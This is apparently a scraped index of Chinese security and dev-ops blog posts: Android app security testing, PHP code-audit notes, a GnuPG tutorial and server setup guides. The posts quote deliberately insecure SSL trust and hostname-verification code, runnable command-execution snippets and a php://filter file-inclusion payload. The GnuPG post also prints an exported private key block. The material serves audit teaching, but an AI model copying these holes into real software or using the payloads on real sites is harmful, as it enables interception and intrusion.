检测结论\n若App在切入后台运行时，本地生成的临时文件db、xml、cache中的数据或者运行时内存中的用户数据做到了及时清理，则通过测试\n  修复建议\nApp在切入后台运行后，应及时清理本地存储的用户敏感信息和内存中的数据信息\n  \n敏感数据清除检测   检测目的\n检测App在退出或被卸载时，是否彻底删除在手机本地存储的文件、数据库、缓存、配置信息等文件\n  检测方法\n使用反编译工具apktool对目标文件进行反编译，查看App代码中是否具有清除缓存信息的方法 removeSessionCookie()/deleteCookie()\nif(\u0026quot;ClearWebView\u0026quot; , \u0026quot;webView.clearCache\u0026quot;){ try{ CookieSyncManager.createInstance(this.Y.getApplicationContext()); CookieSyncManager.getInstance().removeSessionCookie(); CookieSyncManager.getInstance().sync(); }catch(Exception v0_1){ } }    检测结论\n若本地生成文件仍然存在，则本项测试 不通过\n  修复建议\n检测App在退出或被卸载时，应彻底删除在手机本地存储的文件、数据库、缓存、配置信息等信息\n  \n网络传输安全测试 - 网络通信 \n安全传输层测试 \nTLS实现检测   检测目的\n检测客户端与服务器端交互核心的通信会话是否采用HTTPS，同时是否为现有最佳实践方式\n  检测方法\n使用Burpsuite/Wireshark抓包，判定用户登录、交易等私密连接是否使用HTTPS进行网络通信，查看TLS版本是否高于1.0\n  检测结论\n若客户端与服务器端通信采用HTTPS，且TLS版本高于1.0，则通过测试\n  修复建议\n客户端与服务器端核心的通信会话均采用HTTPS，同时TLS版本高于1.0\n  \nCA证书检测   检测目的\n检测客户端与服务器建立安全通道时，客户端是否验证远程端点的X.509证书，是否只接受受信任的CA签名证书\n  检测方法\n检测CA证书的合法性，是否为受信任的CA签名证书，App是否只接受受信任的CA签名证书\n 抓取App与服务器端交互的数据，校验证书的颁发机构 在源码中检查客户端是否只接受受信任的CA签名证书    检测结论\n若截获的数据包中证书由可信任机构签发，且在有效期内，且访问服务器与证书绑定的一致，同时只接受信任的CA签名证书，则通过测试\n  修复建议\n客户端验证远程端点的X.509证书，只接受受信任的CA签名的证书\n  \n证书校验检测   检测目的\n检测客户端和服务器是否对证书进行双向校验\n  检测方法\n 反编译App代码，检测是否存在客户端验证服务器端证书的代码  验证证书内容有效性、数字摘要是否一致   反编译App代码，检测是否存在客户端发送本地证书给服务器端认证的代码    检测结论\n若客户端对服务器端返回的证书进行了验证，同时服务器端也对客户端证书进行了校验，则通过测试\n  修复建议\n建议一般的App要实现客户端对服务器端证书的单向验证，对于安全要求比较高的App，要实现客户端与服务器端证书的双向验证\n  \n主机名校验   检测目的\n检测客户端是否对主机名进行校验\n  检测方法\n反编译App代码，查找App通信的代码，查看 setHostnameVerifier() 方法接受任意域名还是进行了主机名验证\npublic static SSLSocketFactory getFixedSocketFactory(){ MySSLSocketFactory v0; try{ v0=new MySSLSocketFactory(MySSLSocketFactory.getKeystore()); //缺陷代码 ((SSLSocketFactory)v0).setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER); }catch(Throwable v1){ v1.printStackTrace(); SSLSocketFactory v0_1 = SSLSocketFactory.getSocketFactory(); } return ((SSLSocketFactory)v0); }    检测结论\n若App接受任意域名，则本项测试 不通过\n  修复建议\nApp对主机名进行校验，不能接受任意域名\n  \n数据加密检测 \n检测目的 检测在客户端与服务器端通信过程中，业务数据是否以明文方式在网络中传输，数据加密的复杂度如何\n\n检测方法  对客户端与服务器端通信的登陆、支付、转账等核心功能进行抓包，查看业务数据是否以明文方式在网络中传输 检测数据加密方式的复杂度，url编码、Base64编码、AES\\DES加密等  \n检测结论 若客户端与服务器端交互的业务数据经过多个复杂的算法加密，且无法破解，则通过测试\n\n修复建议 客户端与服务器端交互的上行/下行数据要经过多个复杂算法进行加密，同时加密存储对称加密算法密钥\n\n中间人攻击测试 \nHTTP中间人会话劫持检测   检测目的\n检测客户端与服务器端交互的数据是否可以被任意篡改，导致重放攻击漏洞\n  检测方法\n运行测试App，点击登陆，拦截数据包，并进行修改后放行，查看App运行结果是否能够修改成功\n  检测结论\n若客户端与服务器端交互的数据经过加密处理，且数据无法修改，则通过测试\n  修复建议\n 采用高强度的加密算法对交互数据进行加密/或使用HTTPS 对客户端请求的数据和服务器端返回的数据进行完整性校验，防止被篡改    \nHTTPS中间人会话劫持检测   检测目的\n检测App在使用HTTPS时，是否存在中间人攻击漏洞\n  检测方法\n  反编译源码，查看是否校验服务器端是否可信- 查看实现X509TrustManager接口中 checkServerTrusted() 方法实现是否为空\npublic MySSLSocketFactory(KeyStore truststore) throws NoSuchAlgorithmException, KeyManagementException{ this.sslContext = SSLContext.getInstance(\u0026quot;TLS\u0026quot;); this.sslContext.init(null,new TrustManager[]{new X509TrustManager(){ public X509Certificate[] getAcceptedIssuers(){ return null; } public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException{ //实现逻辑为空 } public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException{ //实现逻辑为空 } }},null); }    反编译源码，查看站点域名与站点证书的域名是否匹配- 查看 HostnameVerifier() 方法中的 verify() 函数是否存在域名校验\nNetworkUtils.conn=null;\nNetworkUtils.is =null;\nNetworkUtils.os=null;\nNetowrkUtils.DO_NOT_VERIFY = new HostanmeVerifier(){\npublic boolean verify(String s, SSLSession sslSession){\nreturn 1; // 不检查站点域名和站点证书的域名\n}\n}\n  查看 sethostnameverifier() 方法是否接受任意域名\npublic static SSLSocketFactory getFixedSocketFactory(){ MySSLSocketFactory v0; try{ v0=new MySSLSocketFactory(MySSLSocketFactory.getKeystore()); //缺陷代码 ((SSLSocketFactory)v0).setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER); }catch(Throwable v1){ v1.printStackTrace(); SSLSocketFactory v0_1 = SSLSocketFactory.getSocketFactory(); } return null; }      检测结论\n若客户端不进行服务器端是否可信、不进行域名校验、接受任意域名，对APP数据包进行拦截和篡改，则造成中间人攻击的风险。\n若客户端对服务器端返回的SSL证书进行强校验，则通过测试\n  修复建议\n对SSL证书进行签名CA是否合法、证书是否自签名、主机域名是否匹配、证书是否过期等校验。\n  \nApp加固技术   第一代加固技术： 通过对源码进行\n 压缩： 检测并一处代码中无用的类、字段、方法和特性 优化： 对字节码进行优化，移除无用指令 混淆： 使用a、b、c、d等无意义字符对类、字段、方法进行重命名 预检： 在Java平台上对处理后的代码进行预检，确保加载的class文件时可执行    第二代加固技术： 对原始App的dex文件加密，并外包一层克，将App的核心代码进行隐藏\n  第三代加固技术： 对dex文件中所有的类及方法函数内容进行抽取、加密和隐藏，单独加密后存放在apk中的特定文件内\n  第四代加固技术： DVMP(dex虚拟机保护) 具有自定义虚拟机、指令集和解释器，未保护的代码在系统虚拟机中运行，保护代码在自定义虚拟机运行\n  Table of Contents  应用脱壳  安装Frida客户端    \n应用脱壳 \n安装Frida客户端   在Android上安装Frida Server\nadb shell getprop ro.build.version.release # 获取Android版本号 adb shell getprop ro.product.cpu.abi # 查看CPU架构,根据架构下载对应的frida-server-14.2.18-android-arm64.xz xz -d frida-server-14.2.18-android-arm64.xz # 解压frida-server adb push frida-server-14.2.18-android-arm64 /data/local/tmp # 传输到/data/local/tmp目录下 adb shell su chmod a+x /data/local/tmp/frida-server-14.2.18-android-arm64 adb forward tcp:27042 tcp:27042 adb forward tcp:27043 tcp:27043 ./frida-server-14.2.18-android-arm64 python dexDump.py com.test.aspiredoctor    在macOS上安装Frida Client\npip3 install frida frida-tools    Footnotes 1 替换Android系统/system/bin/appprocess文件\n2 如apk文件和dex文件\n3 可导致调用系统功能截取屏幕和录像窃取用户信息，界面劫持，对用户进行钓鱼\n4 检测客户端程序是否对已经root的android系统、模拟器和逆向框架进行检测\n5 检测客户端程序是否进行代码加密、代码混淆和代码加固，是否易被逆向并泄露程序的设计原理和运行流程\n6 检测客户程序是否对自身进行校验\n7 检测客户端程序是否可被外部程序动态调试并输出敏感信息\n8 检测客户端程序是否存在进程保护和内存保护，防止被外部程序动态注入so文件到指定进程、以及任意修改、转储内存代码行为\n","description":"","id":25,"section":"en","tags":[""],"title":"Android软件测试基础","uri":"http://crkmythical.github.io/en/blog/android%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"},{"content":"编写进度\n   Table of Contents  How to convert .mov or .mp4 to .gif using the command line  How to convert    \nHow to convert .mov or .mp4 to .gif using the command line Requirements\nbrew install ffmpeg brew install gifsicle  \nHow to convert ffmpeg -i in.mov -s 600x400 -pix_fmt rgb24 -r 10 -f gif - | gifsicle --optimize=3 --delay=3 \u0026gt; out.gif  Arguments:\n-r 10 to reduce the frame rate from 25 fps to 10 fps -s 600x400 to determine the output size. --delay=3 to have a delay of 30ms between each gif --optimize=3 to use the most file-size optimized algorithm  ","description":"","id":26,"section":"en","tags":null,"title":"如何将视频转化为Gif","uri":"http://crkmythical.github.io/en/blog/%E5%A6%82%E4%BD%95%E5%B0%86%E8%A7%86%E9%A2%91%E8%BD%AC%E5%8C%96%E4%B8%BAgif/"},{"content":"编写进度\n   Table of Contents  PHP Audit  代码审计常见思路 Untrusted Data ,使用不可信的数据 Command Execution, 命令执行 Code Execution, 代码执行 Information Discloure, 信息泄露 Insecure Cryptographic Functions, 不安全的加密函数   常见危险函数  代码执行函数 包含函数 命令执行函数 文件操作函数 特殊函数 变量覆盖    \nPHP Audit RIPS VCG\n代码审计本质： unfilter_function(param_input)\n找漏洞 -\u0026gt; 找可以控制的变量(参数)=paraminput= -\u0026gt; 危险函数(paraminput)\n漏洞形成条件：\n 可以控制的变量(外部输入) –\u0026gt; 内因 危险(未过滤参数)函数接收外部输入 –\u0026gt; 决定漏洞的类型  隐式输入： 用户传递数据-\u0026gt; 数据库/缓存文件等地方 -\u0026gt; 程序代码处理-\u0026gt;程序代码\n显式输入： 用户传递数据-\u0026gt; 程序代码处理\n\n代码审计常见思路  正向追踪： 变量 –\u0026gt; 函数 逆向追踪： 函数 –\u0026gt; 变量 常见功能点定向审计 第三方组件,中间件版本比对 补丁比对，反推漏洞位置 工具扫描+人工验证  \nUntrusted Data ,使用不可信的数据 $_REQUEST 参数中的数据是浏览器可控的，黑客可以通过巧妙的构造覆盖PHP全局参数\n\nCommand Execution, 命令执行 PHP中存在敏感函数可以执行系统命令，常见这类函数如下：\nexec shell_exec system passthru popen proc_open pcntl_exec  \nCode Execution, 代码执行 PHP中存在敏感函数可以执行PHP代码段，常见函数如下：\neval assert preg_replace create_function  \nInformation Discloure, 信息泄露 常见信息泄露的函数有 phpinfo~、~show_source\n\nInsecure Cryptographic Functions, 不安全的加密函数  md5 CRYPTSTDDES CRYPTEXTDES CRYTPTMD5等  \n常见危险函数 \n代码执行函数   eval()\n  assert()\n  preg_replace\n  create_funtion\n  call_user_func\n  call_user_func_array\n@eval('echo \u0026quot;test-echo\u0026quot;;'); echo '\u0026lt;hr\u0026gt;'; assert('system(\u0026quot;whoami\u0026quot;)'); // preg_replace(\u0026quot;/test/e\u0026quot;,\u0026quot;phpinfo();\u0026quot;,\u0026quot;just test\u0026quot;); echo '\u0026lt;hr\u0026gt;'; $cfunc=create_function('$v','return system($v);'); $cfunc('whoami'); echo '\u0026lt;hr\u0026gt;'; $sfunc='sys'.'tem'; $sfunc('whoami'); echo '\u0026lt;hr\u0026gt;'; function callback($var){ echo \u0026quot;call test $var\u0026quot;; } call_user_func('callback','crkmyth1cal');    \n包含函数   require\n  include\n  require_once\n  include_once\ninclude $file;\ninclude($_GET[\u0026lsquo;file\u0026rsquo;]);\n// ?file=php://filter/convert.base64-encode/resource=index.php\n  \n命令执行函数   exec\n  system\n  popen\n  proc_open\n  passthru\n  shell_exec\necho shell_exec(\u0026lsquo;ping www.baidu.com\u0026rsquo;);\necho shell_exec(\u0026lsquo;whoami\u0026rsquo;);\n  \n文件操作函数 读取：读取配置文件，获取key\n写入：写入shell代码\n删除：删除 .lock 文件，重新安装\n  copy\n  file_get_contents\n  file_put_contents\n  file\n  glob\n  fopen\n  move_uploaded_file\n  readfile\n  rename\n  delete\n  rmdir\n  unlink\n  symlink\n  readlink\nfile_put_contents(\u0026quot;baidu.txt\u0026quot;,file_get_contents(\u0026quot;https://www.baidu.com\u0026quot;)); unlink('baidu.txt');    \n特殊函数  phpinfo getenv putenv dl ini_get ini_set ini_alter ini_restore is_numeric in_array  \n变量覆盖  parse_str mb_parse_str extract import_request_variables get_defined_vars get_defined_constants get_defined_functions get_included_files  ","description":"","id":27,"section":"en","tags":null,"title":"PHP代码审计","uri":"http://crkmythical.github.io/en/blog/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"content":"编写进度\n   Table of Contents  软件安装  配置路径    \n软件安装   php-fpm : FastCGI进城管理器(mac自带)\n  nginx : 高性能的HTTP和反向代理web服务器\nbrew install nginx\nUpdating Homebrew\u0026hellip;\n==\u0026gt; Downloading from https://pkg-containers.githubusercontent.com/ghcr1/blobs/sha256:8ba34676e573272aa1f73d4dcf6bfddbaa69746a92bf812f6760b######################################################################## 100.0%\n==\u0026gt; Pouring nginx\u0026ndash;1.21.1.big_sur.bottle.tar.gz\n==\u0026gt; Caveats\nDocroot is: /usr/local/var/www\nThe default port has been set in /usr/local/etc/nginx/nginx.conf to 8080 so that\nnginx can run without sudo.\nnginx will load all files in /usr/local/etc/nginx/servers/.\nTo have launchd start nginx now and restart at login:\nbrew services start nginx\nOr, if you don\u0026rsquo;t want/need a background service you can just run:\nnginx\n==\u0026gt; Summary\n🍺 /usr/local/Cellar/nginx/1.21.1: 25 files, 2.2MB\nbrew services start nginx # 开机自启nginx\n  \n配置路径   nginx安装路径 /usr/local/Cellar/nginx/1.21.1\n  nginx配置文件 /usr/local/etc/nginx/nginx.conf\n  Docroot /usr/local/var/www\n  php-fpm配置文件 /etc/php-fpm.conf.default\ncp /private/etc/php-fpm.conf.default /private/etc/php-fpm.conf\ncp /private/etc/php-fpm.d/www.conf.default /private/etc/php-fpm.d/www.conf\n  创建errorlog文件\nmkdir /usr/local/var/log/php-fpm touch /usr/local/var/log/php-fpm/php-fpm.log //修改php-fpm.conf error_log = /usr/local/var/log/php-fpm/php-fpm.log    参考：\n基于Mac自带nginx,php配置php运行环境\n","description":"","id":28,"section":"en","tags":null,"title":"Mac下搭建Nginx+php开发平台","uri":"http://crkmythical.github.io/en/blog/mac%E4%B8%8B%E6%90%AD%E5%BB%BAnginx-php%E5%BC%80%E5%8F%91%E5%B9%B3%E5%8F%B0/"},{"content":"编写进度\n   Table of Contents  Gnu PG基本操作  生成公/私钥 更改密钥密码 列出公/私钥 导出公/私钥 导入公/私钥 验证公钥 删除公钥/私钥 废除密钥 exchange on keyservers   应用-加解密文件  公钥方式 对称密码方法   应用-数字签名  私钥创建,公钥验证    \nGnu PG基本操作 brew install gpg\n\n生成公/私钥 gpg --gen-key gpg (GnuPG) 2.3.1; Copyright (C) 2021 Free Software Foundation, Inc. This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. gpg: directory '/Users/crkmyth1cal/.gnupg' created gpg: keybox '/Users/crkmyth1cal/.gnupg/pubring.kbx' created Note: Use \u0026quot;gpg --full-generate-key\u0026quot; for a full featured key generation dialog. GnuPG needs to construct a user ID to identify your key. Real name: crkmyth1cal Email address: crkmyth1cal@protonmail.com You selected this USER-ID: \u0026quot;crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt;\u0026quot; Change (N)ame, (E)mail, or (O)kay/(Q)uit? O We need to generate a lot of random bytes. It is a good idea to perform some other action (type on the keyboard, move the mouse, utilize the disks) during the prime generation; this gives the random number generator a better chance to gain enough entropy. We need to generate a lot of random bytes. It is a good idea to perform some other action (type on the keyboard, move the mouse, utilize the disks) during the prime generation; this gives the random number generator a better chance to gain enough entropy. gpg: /Users/crkmyth1cal/.gnupg/trustdb.gpg: trustdb created gpg: key AA72032823A2ECCA marked as ultimately trusted gpg: directory '/Users/crkmyth1cal/.gnupg/openpgp-revocs.d' created gpg: revocation certificate stored as '/Users/crkmyth1cal/.gnupg/openpgp-revocs.d/CDD514503006241E57352861AA72032823A2ECCA.rev' public and secret key created and signed. pub ed25519 2021-06-19 [SC] [expires: 2023-06-19] CDD514503006241E57352861AA72032823A2ECCA uid crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt; sub cv25519 2021-06-19 [E] [expires: 2023-06-19]  \n更改密钥密码 gpg --change-passphrase crkmyth1cal gpg (GnuPG) 2.3.1; Copyright (C) 2021 Free Software Foundation, Inc. This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law.  \n列出公/私钥 gpg --list-keys # or -k /Users/crkmyth1cal/.gnupg/pubring.kbx ------------------------------------- pub ed25519 2021-06-19 [SC] [expires: 2023-06-19] CDD514503006241E57352861AA72032823A2ECCA uid [ultimate] crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt; sub cv25519 2021-06-19 [E] [expires: 2023-06-19] gpg --list-secret-key # or -K /Users/crkmyth1cal/.gnupg/pubring.kbx ------------------------------------- sec ed25519 2021-06-19 [SC] [expires: 2023-06-19] CDD514503006241E57352861AA72032823A2ECCA uid [ultimate] crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt; ssb cv25519 2021-06-19 [E] [expires: 2023-06-19]  \n导出公/私钥 gpg -a -o crkmyth1cal.gpg --export crkmyth1cal@protonmail.com -----BEGIN PGP PUBLIC KEY BLOCK----- mDMEYM1ptRYJKwYBBAHaRw8BAQdAaHUGQrDArp3fZYv3MxlT6yxP9/CW5wAgdP7n Lfqz4MO0KGNya215dGgxY2FsIDxjcmtteXRoMWNhbEBwcm90b25tYWlsLmNvbT6I mgQTFgoAQhYhBM3VFFAwBiQeVzUoYapyAygjouzKBQJgzWm1AhsDBQkDwmcABQsJ CAcCAyICAQYVCgkICwIEFgIDAQIeBwIXgAAKCRCqcgMoI6LsynziAQCa+VwORih0 H2Ycnx8vaM4hwr1iyySb3Bb5o0caHdeu3QEAzBAaIX6JnVPJnIskca6b+k+iJJsW B0xG/GTwp/G5Egi4OARgzWm1EgorBgEEAZdVAQUBAQdAmrrwVy7J5GgqpA9PfB63 oTVQAKR/w6aARrqQ7VNybWYDAQgHiH4EGBYKACYWIQTN1RRQMAYkHlc1KGGqcgMo I6LsygUCYM1ptQIbDAUJA8JnAAAKCRCqcgMoI6LsyiSuAQD2PfSX8REDV34euf9D RoBg0uKhLTgQtgm2zeEcpm+0UAD/V4KzFUFrwMqHComhztuWLEWiCZdvRn1n+n4v vYFYggQ= =3qda -----END PGP PUBLIC KEY BLOCK----- gpg -ao crkmyth1cal@protonmail.com.private.key --export-secret-keys crkmyth1cal@protonmail.com -----BEGIN PGP PRIVATE KEY BLOCK----- lIYEYM1ptRYJKwYBBAHaRw8BAQdAaHUGQrDArp3fZYv3MxlT6yxP9/CW5wAgdP7n Lfqz4MP+BwMClpMTsR0QrB7z+mUYYoXKHAVO6Sx8Qou3jDkh+13GjO8T0BKtvJxp 4gg+ycTou2JKSF79LJPTVJKMxO+qVL9ZoXNKPMroumiraVtFKp2OOrQoY3JrbXl0 aDFjYWwgPGNya215dGgxY2FsQHByb3Rvbm1haWwuY29tPoiaBBMWCgBCFiEEzdUU UDAGJB5XNShhqnIDKCOi7MoFAmDNabUCGwMFCQPCZwAFCwkIBwIDIgIBBhUKCQgL AgQWAgMBAh4HAheAAAoJEKpyAygjouzKfOIBAJr5XA5GKHQfZhyfHy9oziHCvWLL JJvcFvmjRxod167dAQDMEBohfomdU8mciyRxrpv6T6IkmxYHTEb8ZPCn8bkSCJyL BGDNabUSCisGAQQBl1UBBQEBB0CauvBXLsnkaCqkD098HrehNVAApH/DpoBGupDt U3JtZgMBCAf+BwMC3RGXbNzVlWDz4USVVz26VGm7Wo8VSovee7SFJ2YXwFbx0//u 5luXDYhKK7iTrtjDQqMXk1LOnOdO1HM5nn0uD5N5eTgRKfiDBLZRYRXxaIh+BBgW CgAmFiEEzdUUUDAGJB5XNShhqnIDKCOi7MoFAmDNabUCGwwFCQPCZwAACgkQqnID KCOi7MokrgEA9j30l/ERA1d+Hrn/Q0aAYNLioS04ELYJts3hHKZvtFAA/1eCsxVB a8DKhwqJoc7blixFogmXb0Z9Z/p+L72BWIIE =hdmV -----END PGP PRIVATE KEY BLOCK-----  \n导入公/私钥 gpg --import crkmyth1cal.gpg gpg --import crkmyth1cal.private.key gpg: key AA72032823A2ECCA: \u0026quot;crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt;\u0026quot; not changed gpg: key AA72032823A2ECCA: secret key imported gpg: Total number processed: 1 gpg: unchanged: 1 gpg: secret keys read: 1 gpg: secret keys unchanged: 1  \n验证公钥 gpg --edit-key crkmyth1cal gpg (GnuPG) 2.3.1; Copyright (C) 2021 Free Software Foundation, Inc. This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Secret key is available. sec ed25519/AA72032823A2ECCA created: 2021-06-19 expires: 2023-06-19 usage: SC trust: ultimate validity: ultimate ssb cv25519/603F4ACEF55D04B2 created: 2021-06-19 expires: 2023-06-19 usage: E [ultimate] (1). crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt; gpg\u0026gt; fpr # fingerprint pub ed25519/AA72032823A2ECCA 2021-06-19 crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt; Primary key fingerprint: CDD5 1450 3006 241E 5735 2861 AA72 0328 23A2 ECCA gpg\u0026gt; sign \u0026quot;crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt;\u0026quot; was already signed by key AA72032823A2ECCA Nothing to sign with key AA72032823A2ECCA gpg\u0026gt; quit  \n删除公钥/私钥 gpg --delete-key crkmyth1cal@protonmail.com gpg --delete-secret-key crkmyth1cal@protonmail.com  \n废除密钥 gpg --output revoke.asc --gen-revoke crkmyth1cal@protonmail.com 130 ↵ sec ed25519/AA72032823A2ECCA 2021-06-19 crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt; Create a revocation certificate for this key? (y/N) y Please select the reason for the revocation: 0 = No reason specified 1 = Key has been compromised 2 = Key is superseded 3 = Key is no longer used Q = Cancel (Probably you want to select 1 here) Your decision? 3 Enter an optional description; end it with an empty line: \u0026gt; I'm not used this key \u0026gt; Reason for revocation: Key is no longer used I'm not used this key Is this okay? (y/N) y ASCII armored output forced. Revocation certificate created. Please move it to a medium which you can hide away; if Mallory gets access to this certificate he can use it to make your key unusable. It is smart to print this certificate and store it away, just in case your media become unreadable. But have some caution: The print system of your machine might store the data and make it available to others! gpg --import revoke.asc gpg --send-keys crkmyth1cal@protonmail.com  \nexchange on keyservers gpg --refresh-keys # update all keys from a keyserver gpg: refreshing 1 key from hkps://hkps.pool.sks-keyservers.net gpg: key 32B25331509A6D85: \u0026quot;crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt;\u0026quot; not changed gpg: Total number processed: 1 gpg: unchanged: 1 # 发送key ID到keyserver gpg --send-keys 9001430FA52D253633CB1B8D32B25331509A6D85 2 ↵ gpg: sending key 32B25331509A6D85 to hkps://hkps.pool.sks-keyservers.net gpg --search-keys ethan hunter # search key and import gpg: data source: https://hkps.pool.sks-keyservers.net:443 (1)\tEthan Hunter \u0026lt;Ethanhunter@cock.li\u0026gt; 2048 bit RSA key E6F7CD04BD975343, created: 2018-05-12, expires: 2020-05-12 (expired) Keys 1-1 of 1 for \u0026quot;ethan hunter\u0026quot;. Enter number(s), N)ext, or Q)uit \u0026gt; 1 gpg: key E6F7CD04BD975343: public key \u0026quot;Ethan Hunter \u0026lt;Ethanhunter@cock.li\u0026gt;\u0026quot; imported gpg: Total number processed: 1 gpg: imported: 1 # import keys from a keyserver gpg --receive-keys B9c0165f gpg: key C7BA956CB9C0165F: public key \u0026quot;ethan \u0026lt;askding@bugbank.cn\u0026gt;\u0026quot; imported gpg: Total number processed: 1 gpg: imported: 1  \n应用-加解密文件 \n公钥方式 # encrypt gpg -ao msg.txt.gpg -r crkmyth1cal -e msg.txt # -r = --recipient ,many recipient use : -r askDing -r crkmyth1cal -----BEGIN PGP MESSAGE----- hF4DYD9KzvVdBLISAQdAsW4ri+FuwxVn0pE1/WGl0hsmKL+j5+hWiXRohZFeXGgw 9PDAlAPE5icl3aKaOH2ZLVPaGLerGjRVZDopJqmAH812IPvlZHtZdRSPvBhb39dr 1GkBCQIV1TBYqTyxBsdFBrkOmc9dVS2/720cTcwoEISGa6RRAvzj1wIFDaP9yW0g iA9TybkoHWaM0Gfa2Zb9d3I2FGfV+wnusWr1zl8HUGxQ+HwxaJi0PvRM1T1LZHla +qOU2zzdLNNlXP0= =E0w0 -----END PGP MESSAGE----- # decrypt gpg -o msg.txt -d msg.txt.gpg gpg: encrypted with cv25519 key, ID 603F4ACEF55D04B2, created 2021-06-19 \u0026quot;crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt;\u0026quot;  \n对称密码方法 #encrypt gpg -ao msg.txt.symmetric.gpg -c msg.txt # -c as --symmetric -----BEGIN PGP MESSAGE----- jA0ECQMCDFhZquLMGzHz0loBJfOjQIg8gbP4LwMYHQ1dJzPmEjwPRR9WcT0OffXq Xqjk0ku3bUCXhKcx4FTmapleTSDJUBqHRNmBf94F2cbnSt+JUJZNpyPkY447wDne SYkxccKlP67k+Ro= =6Q3U -----END PGP MESSAGE----- # decrypt gpg -o msg.txt -d msg.txt.symmetric.gpg gpg: AES256.CFB encrypted data gpg: encrypted with 1 passphrase  \n应用-数字签名 \n私钥创建,公钥验证 # sign gpg -ao msg.txt.sign -s msg.txt # -s as --sign -----BEGIN PGP MESSAGE----- owGbwMvMwCVmtCnYMGBWbivjGp0k9tzidL2SipKEs02PSjIyixWAKFEhObE4VSE/ TSE1L7mosqBEIS0zJ5Wro5SFQYyLQVZMkWUCozP/Ul1VM+PT0r0w01iZQGYwcHEK wEQWf2Vk2J26+Yxx+Y4vEWt5l2w8+HDx97CNWmeVDZfnrN7XlPemvp+R4YTTtZ2H xGVayz76q6yb1eRmfiuWbW/wHB3fzS0niydJsQIA =GoIj -----END PGP MESSAGE----- # verify gpg --verify msg.txt.sign gpg: Signature made Sat Jun 19 13:38:42 2021 CST gpg: using EDDSA key 9001430FA52D253633CB1B8D32B25331509A6D85 gpg: Good signature from \u0026quot;crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt;\u0026quot; [ultimate] # verify and restore gpg -o msg.txt -d msg.txt.sign gpg: Signature made Sat Jun 19 13:38:42 2021 CST gpg: using EDDSA key 9001430FA52D253633CB1B8D32B25331509A6D85 gpg: Good signature from \u0026quot;crkmyth1cal \u0026lt;crkmyth1cal@protonmail.com\u0026gt;\u0026quot; [ultimate]  ","description":"","id":29,"section":"en","tags":null,"title":"GnuPG使用教程","uri":"http://crkmythical.github.io/en/blog/gnupg%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"},{"content":"编写进度\n   安装apache2并启用dav模块 1 2  sudo apt install -y apache2 sudo a2enmod dav dav_fs dav_lock auth_digest   创建webdav目录及DavLockDB文件 1 2 3 4  sudo mkdir /var/webdav sudo chown www-data:www-data /var/webdav sudo touch /var/DavLock sudo chown www-data:www-data /var/DavLock   创建访问用户 1 2 3 4 5 6  sudo htpasswd -Bc /var/passwd.dav admin m,./ sudo chmod 640 /var/passwd.dav sudo chown www-data:www-data /var/passwd.dav sudo htpasswd -B /var/passwd.dav admin2 m,./ # 新增用户 sudo htpasswd -D /var/passwd.dav admin2   配置虚拟主机 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  cat \u0026lt;\u0026lt;EOF \u0026gt;/etc/apache2/site-available/webdav.conf \u0026lt;VirtualHost *:80\u0026gt; ServerAdmin webmaster@dummy-host.example.com ServerName dummy-host.example.com ServerAlias www.dummy-host.example.com DocumentRoot /var/webdav ErrorLog \u0026#34;/private/var/log/apache2/dummy-host.example.com-error_log\u0026#34; CustomLog \u0026#34;/private/var/log/apache2/dummy-host.example.com-access_log\u0026#34; common Alias /webdav /var/webdav DavLockDB /var/DavLock \u0026lt;Directory /var/webdav/\u0026gt; Options Indexes MultiViews AllowOverride None Order allow,deny allow from all \u0026lt;/Directory\u0026gt; \u0026lt;Location /webdav\u0026gt; Dav On AuthType Basic AuthName \u0026#34;webDav\u0026#34; AuthUserFile /var/webdav/passwd.dav Require valid-user \u0026lt;/Location\u0026gt; \u0026lt;/VirtualHost\u0026gt; EOF sudo apachectl configtest #测试配置文件   重启服务并测试 1 2  service apache2 restart cadaver http://127.0.0.1/webdav   ","description":"","id":30,"section":"en","tags":null,"title":"在Linux使用apache2搭建webdav服务","uri":"http://crkmythical.github.io/en/blog/%E5%9C%A8linux%E4%BD%BF%E7%94%A8apache2%E6%90%AD%E5%BB%BAwebdav%E6%9C%8D%E5%8A%A1/"},{"content":"编写进度\n   Table of Contents  安装Burp证书系统级证书 (\u0026gt;=Android 7.0，需Root) 微信小程序渗透测试流程  获取微信小程序 下载反编译工具 wxappUnpacker 并反编译小程序 代码审计，找出所有API进行测试    \n安装Burp证书系统级证书 (\u0026gt;=Android 7.0，需Root) 因Android 7以后，系统不再信任用户级的证书，只能信任系统级的证书，所以需要将burp证书安装到Android系统目录下\n  获取Burp证书\n  方法一:\nBurp开启代理后，浏览器访问http://burp 证书 cacert.der\n  方法二:\n    证书转换\nopenssl x509 -inform DER -in cacert.der -out cacert.pem # 证书格式转换 der --\u0026gt; pem openssl version # 查看openssl版本 openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1\t# 打印证书hash值 9a5ba575 openssl版本在1.0以上执行 openssl x509 -inform PEM -subject_hash -in cacert.pem\t| head -1 # 打印证书hash值 openssl版本在1.0以下执行 mv cacert.pem 